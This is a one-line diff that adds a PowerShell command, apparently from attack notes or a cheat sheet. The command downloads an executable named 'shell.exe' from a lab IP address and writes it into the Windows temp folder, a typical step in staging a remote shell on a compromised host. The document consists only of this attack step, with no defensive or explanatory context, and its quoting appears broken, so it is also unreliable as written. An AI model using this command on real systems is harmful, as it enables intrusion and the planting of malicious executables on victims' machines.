@@ -1,0 +1,1 @@
+`powershell -c "Invoke-WebRequest" -Uri 'http://10.10.10.10:80/shell.exe' -OutFile 'c:\windows\temp\shell.exe'`
